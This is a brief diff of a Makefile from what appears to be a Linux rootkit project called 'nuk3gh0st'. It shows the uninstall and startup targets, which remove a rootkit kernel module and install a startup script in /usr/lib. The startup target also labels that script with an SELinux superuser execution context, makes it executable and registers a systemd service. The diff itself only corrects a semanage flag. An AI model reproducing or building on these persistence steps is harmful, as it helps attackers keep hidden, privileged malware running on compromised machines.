@@ -15,7 +15,7 @@ uninstall:
 	rm /usr/lib/rootkit.ko
 startup:
 	cp nuk3gh0st.startup /usr/lib/nuk3gh0st.startup
-	semanage fcontext -a -t su_exec_t -r system_u /usr/lib/nuk3gh0st.startup
+	semanage fcontext -a -t su_exec_t -s system_u /usr/lib/nuk3gh0st.startup
 	restorecon -vF /usr/lib/nuk3gh0st.startup
 	chmod +x /usr/lib/nuk3gh0st.startup
 	cp nuk3gh0st.service /lib/systemd/system/nuk3gh0st.service
